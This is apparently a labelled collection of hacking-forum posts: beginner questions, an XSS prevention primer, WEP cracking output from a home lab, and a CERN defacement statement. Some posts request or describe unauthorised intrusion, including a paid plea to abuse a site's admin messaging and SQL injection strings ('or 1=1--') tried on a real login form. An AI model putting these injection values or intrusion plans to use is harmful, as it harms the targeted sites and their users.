1	How to connect Kali Linux to the internet	hi there, recenty installed kali linux onto a dell pc as the sole operating system. i have logged in but i dont know how to connect to the internet. i have tried looking elsewhere but it seems there are 101 answers which involve some form of programming or networking knowledge. i went on iceweasal, it told me it couldnt connect. i went to the top right hand side and clicked on the networks tab. nothing is coming up, it just has wired network and device not managed. i have the pc connected to my hub through wire so i would have thought it would connect straightaway. any advice would be appreciated. i am new to this if you cant tell.

1	Grey Hat Hacker Needed — Will Pay	"i need a grey-hat hacker to send my message to all members of  ** no *** , for which i can pay up to $1000 (it means that much to me). this grey-hat hack wont harm anyone and will really help me out. please read my message before you draw any conclusions. my goal is to reach out to likeminded people to form a community of existentialists. i know this is going to work because i did it before with automation: i made some friends this way who later invited me to join an earthship they want to build. things got complicated when they moved to the usa, and i dont know how this will turn out, but either way it gives me a reason to try it again, because the more the merrier. if were to build a community from the ground up, were going to need people from all walks of life anyway. im really serious about this: this hack is going to change my life, and ill keep searching for someone who wants to help me until i find someone, whatever it takes. but i have no illusions of learning how to hack in a few weeks or even months, yet this is the only time ill need it. the only way i want the message gotten out is as a personal message, which you could send from the administration system (user id:0000000002), like this guy did:  *** no *** . so, its been done before, in mid-2014, but  *** no ***  didnt say how the hacker did it, so perhaps thats because they never found out. even if theyve fixed it, if theres any website that has lots of backdoors it would have to be  *** and no *** : it used to be very poorly programmed and it took them almost a decade to debug. theyre probably particularly negligent about security, because why would anyone want to hack them? if youre interested, let me know what you think. post a link here to a fake ebay.co.uk listing and title it ""faulty laptop that no one will buy"" so i can search it (just in case), and i will then ""buy"" it within a day. this way, i can keep you to your word and cant be incriminated. please only do this if you know what youre doing: theres no rush, just make sure that you finish before youre detected, lest we lose our chance. youll have 30 days, since buyer protection lasts for 45. (further comments: i want to ask this in all humility, and the money i offer wont take away from the respect that ill always owe you. the sum im offering is probably way higher than what i need to offer, but i want you to have it anyway, because youll have acted from an authentic sense of right and wrong, and people like that can often use it. perhaps im having misconceptions about the way hacking works and well need to wait around until a new vulnerability hits the news. if so, pardon my presumption, but the offer remains open, and i will keep checking on this thread. if this isnt the right place to ask this, i apologize: please let me know if you know anywhere or anyone else that i could ask.) the message i want to send is below: this message is sent on behalf of a member: i want to reach out to the entire community in search of any truly authentic person, anyone who is always themselves and accepts everything they experience inside as part of who they are, without ever limiting themselves for the sake of comfort. if you are such a person, you’ll understand, and you will have been searching for such people as well, because youll have felt how you overwhelm others by expressing yourself, how you transcend what they see as boundaries where you see only the infinite. but to people like us, all consciousness is good, and the only evil is to be unconscious: we would rather have any experience than none at all, because we know there is beauty in everything. if you can imagine youd rather live forever through all that could happen, than ever to cease to exist, then you are the kind of person im looking for. if this very message feels too intense to you, then you can see why i have a problem. we will form a community of our own, one in which no one can tell us what we can or cannot be. together, we can teach each other every possible aspect of the human experience, and the only thing we will not do will be to do anything that will limit ourselves. i’m reaching out to this community because of all the people i’ve met, those i met here have come the closest to this radical freedom. it’s what this community is about, and its what i want to take to a new level. if youre interested, write a public post on facebook or twitter with #standnakedbeforetheeyesofthesun and write an introduction, so that we can find each other. remember to make your post public. with up to 2 million people reading this message, you wont be alone, even if only a tiny fraction will react."
3	Fell foul to eBay fraud	feel utterly embarrassed by this today.  selling a game download voucher on ebay bundled with the console. sold it and the person paid. they emailed asking for the code to be sent and i obliged not really thinking about it. a few hours later loads of emails from ebay saying that the account was compromised and that my auction deleted for safety reasons and the real account owner has been notified.  damage was done before they found out. game code gone and had me feeling really ready to strike back but to who? lol  one to watch out for folks and to be honest, thats clever work by someone. goes to show even ebay isnt safe.
0	What is XSS?	"(yeah... yea... i was going to make this an article, but until we implement another system that doesnt display the output in a cramped up narrow box, ill refrain from doing so.) gotta give something to the curious noobs.... cross-site scripting (xss or css) typically occurs when a malicious third party causes a user to execute a specially formed request from a vulnerable web server. the web server then passes a portion of that request back to the web client, which then interprets it as trusted content. typically, this is javascript code that can then reveal information confidential to that server/client session to the malicious third party. contents       1 the problem        1.1 security and privacy        1.2 user experience        1.3 unauthorized use        1.4 compliance

links    7 books    8 security brownbags on video    9 todo the problem cross site scripting (abbreviated ""xss"") describes an attack method and its associated class of vulnerabilities in which an attacker injects html into a target web site, which is then rendered in a users browser. the html injected usually contains javascript (hence the term), but successful attacks can use java, activex, flash, or even simple html. the range of possible attacks is huge, because the attacker is able to rewrite an attacked web page as if the attacker were the original author of that page, even to the point of removing all content and replacing it with a completely new page. consider the phrase ""html injection"" to be a concise description of what xss encompasses. there are a number of reasons why xss vulnerabilities are a problem: security and privacy    xss attacks are frequently used to steal passwords and credit card numbers, or (often combined with cross-site request forgery attacks) to make purchases on a customers account without their approval. xss attacks may also be used to steal personal information, such as a customers purchase history, address, or other information which our customers expect us to hold private on their behalf.  user experience    xss attacks can make for a degraded user experience, as users find that formerly reliable web sites are not displaying correctly. users will switch to sites that work as expected, whether the user experience problems are caused by us or an attacker.  unauthorized use    xss attacks, because they result in the attacker rewriting our web pages, can cause unwanted and inappropriate use of computing resources at both client and server systems. this can be as simple as a few extra instructions, or as complex as a denial of service attack. xss vulnerabilities offer an attacker the ability to freely use the servers computers as well as those of our customers in some cases.  compliance    xss attacks are called out in the pci-dss, and are also implicitly covered under other compliance standards through the use of language that requires us to control access to the source code of our web pages. xss vulnerabilities are detected en masse at regular scans, and any vulnerabilities found are required to be fixed in order to maintain compliance.  public relations    as with any security vulnerability, if an xss attack succeeds we risk losing the confidence of the public in our brand, as well as substantial financial liability. as a developer or owner of a web site or page, you should be keenly aware of the prospect that you or your management chain may have to explain the presence of a preventable vulnerability on your page.  types xss attacks can be: reflected    reflected xss attacks persuade the victim user into injecting the code himself, usually through an email or link that builds a malicious url.  stored    stored xss attacks happen when the victim user visits a compromised page, such as a comments, forum, review, or profile page into which code has been injected by a previous attack.     typical xss attacks inject ""<script>"" tags, or references to ""javascript:"" urls and functions - but this is not the limit of what can be achieved with an xss injection.  dom-based    dom based xss (or as it is called in some texts, “type-0 xss”) is an xss attack wherein the attack payload is executed as a result of modifying the dom “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. components of an attack xss attacks generally have four components: injection    to engage in an xss attack, the attacker has to prepare a malicious string to pass into the web page. this is typically done through user-entered data, such as form fields, url query parameters, or other strings in the http transaction.  escape    for the xss attack to be successful in executing, it will generally have to escape out of its enclosing structure, tags, or other environment. a form field value may simply close a quote and add a javascript function, for instance going from:     <input name=""username"" value=""fred@example.com"" />     to:     <input name=""username"" value=""fred@example.com"" onfocus=""alert(danger);"" />     this would be accomplished by somehow persuading the page generator that the username is  fred@example.com "" onfocus=""alert(danger);     in some cases, where page generation code allows html tags to be embedded in user-supplied data (a wiki is a good example of this), the escape portion of the xss attack is not even required.  attack    for there to be an xss attack, there must be an attack portion, some behavior that goes against the intentions of the web site owner and the user alike.  cleanup    some attackers would like their victims to believe that they are unharmed. as a result, some xss attacks will contain components to clean up the browser state, so that the page renders as the user expects it to do.     some attackers do not care about cleaning up the page rendering once they have achieved the effect they want.  prevention cross-site scripting can be prevented using two different means, one for input and one for output, that together create ""defense in depth"" and will help prevent malicious data from passing by undetected or unmitigated. use the encode_entities routine in the html::entities module sample code for html output the following code shows the correct use of encode_entities: code:  select all use html::entities; $input = ""badness: < > \"" ""; print encode_entities($input); the code above turns badness: < > ""  & into badness: &lt; &gt; &quot; &#39; &amp; java code:  select all htmlentitycodec codec = new htmlentitycodec(); // html entity encoding javascriptcodec codec = new javascriptcodec(); // javascript encoding xmlentitycodec = new xmlentitycodec(); // xml entity encoding csscodec codec = new javascriptcodec(); // css encoding    use the encode method to perform the appropriate encoding:  code:  select all htmlentitycodec codec = new htmlentitycodec();  string html = codec.encode(""hello <script>alert(owned)</script>""); general: white-list filtering encoding a common way to address cross-site scripting is to encode the data so that it is treated by the receiving system as data rather than code (i.e. a malicious users ""data"" is treated as code when it is executed as javascript). when constructing a web page, it is important to consider that web pages generally contain html and javascript blocks, each of which have different encoding requirements. html for encoding html, make sure you encode or filter, at a minimum, each of < >  "" & if you encode, encode them into their corresponding html entities: &lt; &gt; &#39; &quot; &amp; it is critical that you review your code and anticipate whether the above advice may be insufficient given how user-input interacts with html in your application. javascript untrusted data (like user submitted data) should not be put directly into a script block (within <script> </script> if you are placing untrusted data within a javascript data value, for instance <script>alert(...escape untrusted data before putting here...)</script>     inside a quoted string <script>x=...escape untrusted data before putting here...</script>          one side of a quoted expression <div onmouseover=""x=...escape untrusted data before putting here...""</div>  inside quoted event handler except for alphanumeric characters, escape all characters less than 256 with the \xhh format to prevent switching out of the data value into the script context or into another attribute. do not use any escaping shortcuts like \"" because the quote character may be matched by the html attribute parser which runs first. these escaping shortcuts are also susceptible to ""escape-the-escape"" attacks where the attacker sends \"" and the vulnerable code turns that into \\"" which enables the quote. example in perl/mason : code:  select all <%perl> my $escapedstring = ; # escape each character individually foreach my $char ( split(//, $string) ) {      my $asciivalue = ord($char);      if ( $asciivalue < 256 ) {          # use hex escape \x## for bytes          $escapedstring .= sprintf(""\\x%02x"", $asciivalue);      } elsif ($asciivalue < 65536) {          # use unicode escape \u#### for the basic multilingual plane (bmp)          $escapedstring .= sprintf(""\\u%04x"", $asciivalue);      } else {          # use a surrogate pair \u####\u#### for characters above 65535, the supplementary planes          my $hi = ($asciivalue - 0x10000) / 0x400 + 0xd800;          my $lo = ($asciivalue - 0x10000) % 0x400 + 0xdc00;          $escapedstring .= sprintf(""\\u%04x\\u%04x"", $hi, $lo);      } } return $escapedstring; </%perl> see  http://0xcc.net/jsescape/  for a live demo of javascript encoding. jquery check out this post on how to do html entity encoding in jquery. check for existing attacks finally, consider the possibility that the data may already be the result of an xss attack. to counter this possibility, whenever you have new understanding of possible methods of xss attack, re-examine stored user-supplied data and remove any data that looks like it attempts to attack users. links    owasp xss (cross site scripting) prevention cheat sheet  https://www.owasp.org/index.php/xss_%28 ... heat_sheet   http://ha.ckers.org/xss.html  a good ""cheatsheet"" of different xss scripts to try to inject books

TRIED TIME AND TIME AGAIN TO FIX ETHERNET!!!	i was playing around trying to be able to connect to the wifi pineapple via wifi again, since it only did it via ethernet and wouldnt show up as a wifi network, and i screwed up my ethernet by accident. the only adapter i can diagnose that has something wrong is ethernet. here is my network adapters: here is the error i get when trying to diagnose it: and when i try to fix it as an administrator: i want ethernet protocol back, or whatever protocols ive lost. when doing research i find this and some other sites, but my guess at the solution would be this: http://answers.microsoft.com/en-us/wind ... c5110ab8df https://support.microsoft.com/en-us/kb/299357 i dont think this will work though when it comes to ethernet. anyone got any ideas?

3	Finding an Actual Job in Security	hey all, so a little background about me. got into a startup as the financial side. we only had one person coding the project so i did the code school videos trying to learn what i could as fast as possible. realized that was no where close to enough. currently enrolled at arguably one of the top 5 javascript based bootcamps in the country. just wrapped up the first half the course where we learned a lot of the nitty gritty javascript things, dove into angular, node, express, and a few other frameworks.  i fell in love with the sprints we did on authentication (mostly working with bcrypt and express) and another where we built a chat application and sent xss attacks to each other over a parse api connection.  ive been doing a lot of research since and it seems most companies want people with java/c experience. i have basic sql/nosql knowledge and knowing more will get me a lot further. just hoping someone could shed some light on what they may have experienced or heard through the grape vine. how can you get with only knowing javascript?  thanks

1	gentoo installation problems	so, im trying to install gentoo in a virtual machine. i ran into this problem and began researching what the answer might be. the file system is read only. i cant mount it as read-write. id rather start from the beginning and not make this mistake in the first place rather than fix it where it is. but could someone give me a clue as to how to make a read-only file system read write when i cant write to it to make it read-write in the first place? -- wed jan 20, 2016 9:25 pm -- i tried following these instructions but it stops working at this very same step. i have tried over and over and over again. ive also tried mounting as --rw but thats not working either. could someone give me what to read to install gentoo on a virtual machine? i need a completely up to date guide that i know will work so i can start over. any guide will help. i am determined that if i try hard enough and long enough i can make this work. but an up to date video guide will work. i also tried this guide before my previous attempts so please dont post a link to this: https://www.youtube.com/watch?v=sjwwcw56d6c

0	Wireless Penetration Testing Beginners Guide by by Vivek	here is a book i found on amazon. i will definitely want to get a pdf of it somewhere if you guys say its good. its getting close to the end of the summer and i think i will have enough prerequisite knowledge in networking to begin learning wifi hacking with kali linux. tell me what you think of  kali linux: wireless penetration testing beginners guide by  vivek ramachandran . i was looking for a wireless hacking book that focused on kali linux. i found this book right here. has anyone read it and if you have, what do you think of the book? does anyone know any other good kali linux books that focus on wireless pen-testing? id love to know if you know of any. thanks so much for your opinions. im currently almost there in terms of networking so i thought id ask. i have a wireless hacking book which goes through linux, windows,  and  mac already called hacking exposed: wireless that i have to get back to after learning this stuff. but i am wondering if anyone has read this because i was looking to see if anyone thought it was a good idea to get something that focuses on kali linux wireless hacking. if so, please give your opinion on the book since i havent read this one the way i started the one i already have and didnt understand what i was reading when reading it several months ago. update: i found a free pdf online: http://file.allitebooks.com/20150904/ka ... 0guide.pdf does anyone think i could learn from this easily? do you like it? do you not?
1	WEP network pen test problem	so, i followed a tutorial online. this one: https://www.youtube.com/watch?v=8l9rvashsrq this slide show is where im running into issues: http://s50.photobucket.com/user/austin_ ... slideshow/ basically, im ending up with 3 arp packets consistently. i am going to leave it on tonight, because i just realized im probably going to want to wait a few hours before declaring that it doesnt work bc this stuff takes a while. im wondering since this is taking some hell of a lot longer than 15 minutes. its been like over an hour. anyone know what i gotta do to get the capture working? thanks. the good news is i set up my own personal pen-testing network where i can change the security. hooray!!! code:  select all root@blackjesus:~# aircrack-ng myfirstwifihack-01.cap opening myfirstwifihack-01.cap read 39682 packets.    #  bssid              essid                     encryption    1  c0:56:27:4c:ee:95  pen_testing_network       wep (1006 ivs) choosing first network as target. opening myfirstwifihack-01.cap attack will be restarted every 5000 captured ivs. starting ptw attack with 1006 ivs.                                                             aircrack-ng 1.2 rc3                                             [00:00:02] tested 137941 keys (got 1006 ivs)    kb    depth   byte(vote)     0  139/140   ff(1024) 00( 768) 03( 768) 0d( 768) 12( 768) 13( 768) 18( 768) 1e( 768) 20( 768) 23( 768)      1    2/  8   92(2560) 26(2304) 36(2304) 3a(2304) 3e(2304) 60(2304) 4c(2048) 94(2048) ae(2048) af(2048)      2    7/  2   cd(2304) 4b(2048) 5e(2048) 5f(2048) 64(2048) 99(2048) 9d(2048) be(2048) d4(2048) f9(2048)      3   37/  3   f2(1792) 20(1536) 21(1536) 25(1536) 2f(1536) 34(1536) 4d(1536) 55(1536) 60(1536) 61(1536)      4    2/  3   ba(2304) 03(2048) 77(2048) c1(2048) dc(2048) df(2048) 0b(1792) 1c(1792) 22(1792) 2e(1792)  failed. next try with 5000 ivs.
3	Things to consider	i understand that this is a site that is based off of many things and there are people on here that help each other learn. although, i am noticing that there are users that prey on those that are asking questions and intentionally send them to so-called informative pdf files or links that are malicious, in an attempt to increase their social engineering and hacking skills; theyre simply preying on the weak. i just want to inform users to be aware and trust no one. i really like this site and dont take this the wrong way anyone, but it is true..
1	Unsolved Forensics problem	http://www.filedropper.com/ctf2015usbphysicalimage i was wondering if anyone wanted to take a try at it. its a compressed file you have to repair, and then open the word documents with passwords on them. ive been working at it and havent solved it yet.  problem created by securestate akron hack.
1	Help on hacking?	hello guys im pretty new here so please spare me if there is a specific way im suppose to post or maybe im in the wrong section but here i go  so my teacher just challenged my class saying if anybody is able to hack into his laptop we wouldnt need to do finals and that he would just let us pass the course lol so im here to ask for some help on some tips since im not proficient in hacking. i know a tiny bit but general terms i should be able to understand. so basically he has his own router in class which he gave us the ssid and password to. the router is connected to the schools internet using it as isp and the only thing we cant do is physically access his laptop and router.  oh yea i really dont care too much if i cant or if i dont get an easy pass, this just sounded really interesting and fun so any help or ideas are appreciated thanks   again this is with permission from my teacher/prof -- wed oct 26, 2016 9:22 am -- boomboomrwr wrote: hello guys im pretty new here so please spare me if there is a specific way im suppose to post or maybe im in the wrong section but here i go  so my teacher just challenged my class saying if anybody is able to hack into his laptop we wouldnt need to do finals and that he would just let us pass the course lol so im here to ask for some help on some tips since im not proficient in hacking. i know a tiny bit but general terms i should be able to understand. so basically he has his own router in class which he gave us the ssid and password to. the router is connected to the schools internet using it as isp and the only thing we cant do is physically access his laptop and router.  oh yea i really dont care too much if i cant or if i dont get an easy pass, this just sounded really interesting and fun so any help or ideas are appreciated thanks   again this is with permission from my teacher/prof sorry internet switched and posted this 3 times...

1	Help on hacking?	hello guys im pretty new here so please spare me if there is a specific way im suppose to post or maybe im in the wrong section but here i go  so my teacher just challenged my class saying if anybody is able to hack into his laptop we wouldnt need to do finals and that he would just let us pass the course lol so im here to ask for some help on some tips since im not proficient in hacking. i know a tiny bit but general terms i should be able to understand. so basically he has his own router in class which he gave us the ssid and password to. the router is connected to the schools internet using it as isp and the only thing we cant do is physically access his laptop and router.  oh yea i really dont care too much if i cant or if i dont get an easy pass, this just sounded really interesting and fun so any help or ideas are appreciated thanks   again this is with permission from my teacher/prof

1	Telling if a site is a phishing site?	so i recently came across this site pr0file.1mages.info/ after getting a message from a friend on msn. this person claims they  did not know of this message nor was online, nor anywhere near a computer. ive been looking at this site for awhile trying to figure out if its valid or not, because it doesnt look valid to me. the site came with my friends logon name at the beginning such as superperson.pr0file.1mages.info. basically i want to know how to tell if i site is a phishing site or not without entering any personal information.

3	Web folder sharing (read+write)	"hello all, ive got a asp.net 2.0 website running and one of my web folder need to be shared (read + write, not execute) for webuser and aspnet user, cause i have a module which allow the user to upload their images (only allow image file).  the user can touch that folder by using a web form to upload their images. that form will check and validate all the input data from user carefully using [filefield].postedfile.contenttype, i think this command will get the correct file type, prevent the exploit: ""file have multiple extension"". but one day, i found some files on that folder which are not image type (therere some script file on that folder), i check the web form many times and im pretty sure that the problem is not comming from the upload form.  could some body please give me a clue about this type of hacking. im using asp.net 2.0 (with ajax extension from microsoft), sql 2005 and iis 6 on the windows2003 (autoupdate eveyday). thanks in advance, spidervn"
1	Boolean Algebra	well, im kinda new here at this site and very interested in learning about computers. rewind, first off im a n00b, so theres where i stand. ok, again im trying to learn about computers and thought that id start off by learning asm. i figured we interact with the software and the software interacts with the computer yada, yada, yada; what a great pleace to start. (of course ive heard that, that wasnt a wise idea, but hell...anyway). im trying to learn about boolean algebra and coming from a person who taught himself algebra and the elementary parts of trig...i just dont get what the heck this stuff is all about. i can kinda see some of the mathematical concepts that its built around (associate, distributive, identities...), but i dont get how it works nor do i understand how it relates. just for reference im on chapter 2 (yep the beginning) of the art of assembly which is the subject of this topic. but i cannot grasp what im reading. my question here is: is there anything that i could learn that would prepare me to comprehend this subject a little better?, and/or: is it truly an unwise thing to try to begin my conquest of computers with asm? prethanx!!
3	Appealing to a community, A Film On Hacking.	"mods, ive posted in this in the general section, but i figured it cuold go here cause of the film aspect. hey everyone, my name is mark. me and my team produce independent films as one of our hobbies, and occasionally send them to festivals and whatnot to be seen. we have come up with a good idea for a film that we want to produce, which is also grounded in reality. on september 22nd last year, a 16 year old by the name of ""c0mrade"" hacked into the pentagon and nasa network. youll never guess what we want our film to be on. i know that to some people, im treading in very very deep water, and im here to let you know that im not (check list of what not to put in my mouth at end of post) (ew). we want to make a film about this kid, and we have a surprisingly detailed article about him that we have recovered from an article published (not online) about 7 months ago. i feel that before i ask you my big (or a bunch of little) question(s) i should provide you with some minor points about the film, that some people may want to know before helping out. the film, not to most peoples surprise, is going to be taking the side of the hacker, but not from a destructive position, from a ""set a goal, accomplish the goal"" perspective. from what we understand, the teenage did not have any destructive motive, he just did it to, well, do it. we want to make that clear, yet at the same time portray is accomplishment as a ""good"" one (we dont believe what he did was right, this is videography, im sure u guys understand the idea)."
3	Bill Gates Anti-Unix jokes.	this is a collection of bill gates quotes insulting unix. im sorry, but these are actually pretty funny. 1) if unix is the answer, then it must have been a stupid question.  2) unix is the only virus with a command-interface.  3) how can an operating system from 1970 (unix) be more modern than an operating system from 1978 (vms)?  4) unix - the first computer virus.  5) nfs = nightmare file system.  6) berkeley is famous for lsd and bsd unix. i dont think that is a coincidence.  7) sure, the unix file system corrupts your files, but look how fast it is!  8) friends dont let friends use unix.  9) unix - the ideal operating system for cpus that are never powered up.  10) nothing wrong with unix that a total redesign and rewrite can not fix.  11) unix will be preempted by nt. unix doesnt know it yet - it wont notice until its too late, because unix is the yugoslavia of software, at war with itself -- but its all over.  12) the users of unix systems said speed wasnt an issue when the alpha chip was released. the same people tell their wives and girlfriends that size doesnt matter.  13) if unix were a beer, then it would be shipped in open casks so that anybody could piss in it before delivery.  14) unix is user friendly. its just selective about who its friends are.  15) unix is akin to a religion to some. if things arent done like they are in unix, then they must be bad. sorry, i dont believe in this religion.  16) unix is a four-letter word!  17) vi = virtually incomprehensible.  18) unix is about as user friendly as a blow in the back from an ice-pick, only not quite as productive.  19) what has happend, when a system-manager gets gray-haired in one day ? one day with a unix system !  20) how do you pronounce unix ? you nix !  21) cretin and unix both start with c.  22) the scariest thing about jurassic park was that the control systems were unix.  23) why is using a unix system like being an enuch? everytime you go to do something important, you realize something critical is missing.

2	CERN defaced by Greek Security Team	"greek  hacking group calling themselves greek security team defaced the lxplus.cern.ch web server (mode of entry unknown at present time) and replaced the main page with a statement in the greek language. this is the greek security team’s statement. so, given that i despise misinformation, lets see what they actually said in there!! line-by-line translation: ———————————— 10/09/08 at this time an experiment attempt is being performed in cern. the reason we chose this page is to remind you of some things. it [the deface] did not happen due to a conflict between us and cern’s system administration team but because of the expected increase in number of visitors in the page in the next few days. some data from the base: [...a c/p of the process listing follows...] and some e-mails: [...a c/p of e-mails follows...] the ** have simply been placed so that we don’t expose people who has done nothing to anger us. as we stated in the preamble, we do not want to destroy either the [operating] system or the website... our purpose is to show, through action, our reaction to a lot of ""active"" members of the ghs [greek hacking scene] which has become arrogant (litteral translation of the phrase ""καβαλήσει το καλάμι"", riding the stick) without offering anything... stupid cliques get created simply to insult and cause trouble (translated from ""τραμπούκος"", insulting troublemaker, ""τραμπουκίζω"", cause insult & trouble) through either words or irc channel banning people who are not considered, by them or their flunkies, worthy of their knowlege and their image. some others, the 1337 (leet, elite) of the ""scene"", only chat over cups of coffee and don’t do anything practical, as they are good at gossiping...but of ""security""...what is that? we are 2600...don’t mess with us. irrelevant and quaint! stop salivating and licking and start keyboarding! but, of course, criticising is easy especially when you have many 20year-olds around whispering ""2600?-""2600?. get yourselves in insomnia.gr and start gossiping (litteral translation of ""θάβετε με μεγάλο φτυάρι"", burrying people through gossiping with a big shovel)...but it will also bear the seal of gst. we are everywhere...because unlike you we don’t spend our nights writing songs or ""rapping"" away in public squares...nor do we laugh at what we cannot touch... we don’t publicly expose you (translated from ""ξεβρακώνουμε"", pulling your underpants down, greek expression) because we don’t want to see you all running like mad and naked trying to find a hiding place and because we are not like you. you should, however, expect the response when you were laughing at things you had never considered doing...but we have spent enough time dealing with a bunch of schoolkids who learned about hacking through hollywood movies and their dumb american culture of the neo-geek who reads hacking magazines while trying to crack his girlfriend’s e-mail account to see if she’s being unfaithful and has linux on dual-boot to pose (translated from ""ψαρώνει"", greek expression) to his mates who also read neo-hacking mania-inspired magazines. the entire greek internet is riddled with holes...some of the biggest government sites don’t even know the term ""security""...since they assign the design of their sites to irrelevant companies. security is not conducted by pay-offs. we are everywhere... we salute the real hobbyists and the fanciers of the art of computers. some old ones who stopped because they were bored and tired not with this art but with the stuck-up attitude (translated from ""κόμπλεξ"") of all those ""specialists"" in the field!! and the young ones who don’t say many words but work with their heads down because what they care about is knowledge, and only knowledge!! dear cern admins we patched the biggest bug in your webpage so it doesn’t turn into a dork and gets defaced every day with the silliness of every wannabe hacker. don’t try to find us...we will find you...pretty soon!!! tnx mr server [lxplus.cern.ch]"

2	Antivirus XP 2008	"there is a very serious virus out there entitled ""antivirus xp 2008."" it is an automatic download if you cross any site that its linked into. one of my family members accidentally downloaded it to my personal computer, which was loaded with pornography (something i dont like having on my computer due to the virus epidemic), and soon i traced it back to a website called ""youpornlite.com"" i highly recommend staying away from this website unless you like the challenge of a virus. two of my friends and i eliminated the virus 100%. it was truly ingenious in design. once we discovered its origin (not ypl.com), we were ready to replicate and resend to the computer, however its creator put a curious trip and once we discovered the source it ate itself. put simple, it deleted itself without a trace through my hard drive. we scanned every ounce of information on my computer and it was/is no where to be found. steps we followed to help stop the virus from completely overtaking my computer are as follows: download: malwarebytes. kaspersky antivirus (we got the trial version because we didnt want to cash out for it if the computer died.) we also uninstalled it estimated about 20 times, perhaps more. if you run into this virus, try to fight it head on. please record what you did to destroy it. kal."

1	Backdoor.Bifrose	hey all! im new to hacking, but i hope ill be able to learn a lot from this site. it absolutely seems like its one of the most professional ones out there and a really good source of information for people who are willing to learn. anyway, my real problem is that ive been attacked by a  backdoor.bifrose  trojan at least three times. on one of my laptops i have an anti-virus that takes care of it as soon as it starts running, but my other laptops anti-virus doesnt find any problems. the symptoms i got on that one matches the description of the  bifrose  symptoms, so im assuming thats the little fu*ker that messed it up. so after doing a little research im able to track it back to some ahole in shanghai, china. however, knowing who fu*ked me up doesnt really help me protect myself, so if anyone has any suggestions on how this trojan entered my computer, ill be very grateful. and just so you know, im a careful guy. i dont download random crap and i use the wot (web of trust) addon for firefox. all help is appreciated. thanks a lot
1	So I am a noob but I am very intelligent - I want to learn	"so i am a noob but i am very intelligent,  i am starting you could say from ground 0 and it has always been a goal of mine to learn more about computers in regards to accessing. for me it was one of those things like ""paint a self portrait"" go ""sky diving"" you know things to do before you die lol, but i was laid off and i have decided its good time to start learning while i have down time. what i would like to learn is how to access another computer from my computer for education purposes you could say interest. i have a legal way to practice also. i live in a 3 bedroom condo, and have an office which has a comp and this one i am typing on in my bedroom, so i would like to use the one in my office as my target computer since it really is just a back up and is old. what i would like to do is, learn how to ""break"" into my own computer (other then turning it on and logging in lol).  it has the same ip as me, and it is split onto a router the same one this computer uses. so i doubt it would be hard but it is something i do not know how to do.  i would like to learn in a fashion as if i didnt own it (although i do) and all i knew was the ip for the machine, if this is possible. the target computer also doesnt have a user log in password, does this matter ? should i set one ? thank you in advance if anyone attempts to help me learn."

1	AntiVirus	hey, guys! im trying to get together a topic where you can post an anti-virus that you think is the best, and tell why you think it is. please include what kind it is (ad-ware, spy-ware, anti-virus, whether its free or not, etc), why you think its good, any personal experience, and so on.
1	Assembly/DLLs	"hi. i was wondering where the best place would be to start learning about making dlls that can be used to ""hack"" programs (like games). im pretty familiar with programming basics, and ive done a little bit of hacking, but nothing like what im trying to accomplish right now. please dont immediately write me off as a stupid little kid because my question is game-related. the game i am referring to allows people to write all kinds of scripts. it even has its own kind of scripting language. a while ago, someone made a .dll that could be copied into the game folder, and it would allow you to call a function in a script. this function would give you the positions (in x,y,z coordinates) of other players in the game. you can imagine that this information could be fairly useful. after asking around, people told me that the person who made the .dll did so using assembly. ive seen some assembly before, but thats about it. i want to know how this .dll was made, but i have no idea where to start. does anyone know anything about this kind of stuff?"
1	Need help-please!	"first of all, im not a n00b so please dont tell me to read some tutorials and learn basics, because i already know. im trying to get information from a table from database from a particular web site. there is a simple form(username and pass) which is processed by same index.php on which the form is. i first of all, check cookies then if there is any js (there is none), no hidden stuff(as far as i know), no ssi, so i next thing i tried logically was sql injection. i tried some basics first--> or 1=1-- for username and pass, and i got in. nothing interesting, because i wanted to get the info of everyone from database.  then the stuff became interesting. if i tried or 1=1-- for username and blabla for pass, i get these error: database error: select id, name, surname, uporabniskoime, skupina, lan from ajm_mail_userdata where uporabniskoime=or 1=1-- and geslo=blabla and cv_flag =1. so good for me, now i know the database name(ajm_mail_userdata) and all the columns. but whatever technique of sql injection i tried next to get data from columns(union top 1.....; union all; just select,...) it didnt worked.    i tryed with all sorts(i could think of) of  changing with "" and -- with # and other things. the problem is i always get the error: database error......! no odbc error message, so no information whatsoever.  so my questions in this long post are:  why no odbc error? is ""database error"" telling me something about which system/database is used on that site? why is union,... not working, as it is clear the php page is vulnerable to sql injection? what cv_flag=1 means (it must be important cuz its joined with the pass query with and)? and finally, is any1 have any ideas how to break this problem?  thank you all"
1	need some learning advice	i have just a few questions that maybe some of you can help me out with. first i want to know how can i get the most learning out of my time. i work about 10 to 12 hours a day and im off on sundays. the good news is i do work in the technology field. lately i have been doing a lot of the same stuff over and over.( cleaning off virus, trojans and malware from clients computers.) that pretty much consumes most of my work time. what i am looking for is some ideas, and things i can try to help me manage my time off better so i can learn more about what i like. right now im pretty much all over the place. you know how you get on google and you do a search for something and find what you like then you find something else that you were not expecting and you start to look into to it. dont get me wrong i have been learning a lot but i dont know if i am really learning and using my time efficiently or am i wasting a lot of my time. when im not at work im at home on my computers and trying to learn what ever i can. i just started doing the missions and i find them to be pretty cool too. just any ideas would be greatly appreciated. second what are some good sources of energy. i have tried coffee, and a couple of energy drinks but i dont think i am drinking the right stuff. thanks in advance.
1	What do you do after cracking a network?	hi, my question may seem a little bit newb for you guys, but i have never done this kind of things and i was being curious on how you guys do... or could do i see a lot of questions regarding wireless network cracking, but after cracking it, what do you guys do? i mean... i know you can then use the connection, but would people want to crack it for other reasons? what if you would like to gain access to a computer in this network (like if you want to have files access and things like that)?  ... all of this is theoretical of course. edit : i tried to write this post in a way that it stays legal to talk about this subject... if the post is breaking a rule, please do not hesitate to delete it and tell me.
1	telnet doesnt connect to any external IP	i know i will probably get flamed or reprised for this but im trying to hack my friends computer to see if i can actually hack a computer. i have a bet with him that i can hack him before the week is done. i hardly know anything about c++, perl, any intrusion programs and the only good tutorial i can find for beginners is  http://www.port7alliance.com/txt/hackbg.html  which tells me i have to use telnet to connect to his computer and kc or cracker jack to crack the password and username login. it tells me how to do this if the person i am hacking uses a unix based system but he has a windows nt (xp) system. how do i connect with telnet and get into his computer by cracking his password? then what do i do after that? the worst problem i have now is telnet wont even connect to any external ip, my computer or modem or antivirus is fucked. excuse the language but its really ******* annoying. ive forwarded ports 23, 21, 79 and 513 for rlogin but it still doesnt work.

